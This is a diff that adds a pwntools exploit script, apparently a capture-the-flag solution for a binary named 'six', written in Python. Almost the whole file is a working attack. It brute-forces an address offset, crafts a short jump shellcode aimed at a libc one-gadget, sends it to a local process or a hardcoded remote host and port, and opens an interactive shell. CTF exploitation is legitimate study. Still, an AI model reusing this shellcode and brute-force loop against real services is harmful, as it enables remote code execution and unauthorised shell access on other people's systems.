@@ -1,0 +1,78 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+#
+# Copyright © 2018 hzshang <hzshang15@gmail.com>
+
+from pwn import *
+context.log_level="debug"
+pwn_file="./six"
+elf=ELF(pwn_file)
+#libc=ELF("./libc.so.6")
+#heap_add=0
+#stack_add=0
+#if len(sys.argv)==1:
+#    r=process(pwn_file)
+#    pid=r.pid
+#else:
+#    r=remote("49.4.64.118",32714)
+#    pid=0
+
+def debug():
+    log.debug("process pid:%d"%pid)
+    #log.debug("stack add:0x%x"%stack_add)
+    #log.debug("heap add:0x%x"%heap_add)
+    #log.debug("libc add:0x%x"%libc.add)
+    pause()
+
+def brute(off):
+    try:
+        gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
+        #dis=0x5ee035
+        dis=0x5ee035+off*0x1000
+        code="\xe9"+p32((gadget[2]-dis)&0xffffffff)
+        a=0
+        b=0
+        for i in code:
+            if ord(i)%2==1:
+                a+=1
+            else:
+                b+=1
+        if abs(a-b)>1:
+            return "FUCK"
+        
+        if a<b:
+            code+="\x01"
+        else:
+            code+="\x00"
+
+        if len(sys.argv)==1:
+            r=process(pwn_file)
+            #r=remote("127.1",23333)
+        else:
+            r=remote("49.4.64.118",32714)
+        r.sendafter("Show Ne0 your shellcode:\n",code)
+        #r.sendline("cat flag")
+        #data=r.recvline()
+        r.sendline("\n\necho 1\n")
+        r.recvline()
+        r.interactive()
+        r.close()
+        return True
+    except Exception as e:
+        r.close()
+        return False
+
+for i in range(-0x4,0x4):
+    for _ in range(0x30):
+        stat=brute(i)
+        if stat=="FUCK":
+            break
+        if stat==True:
+            exit(0)
+        if stat==False:
+            continue
+
+
+
+
+
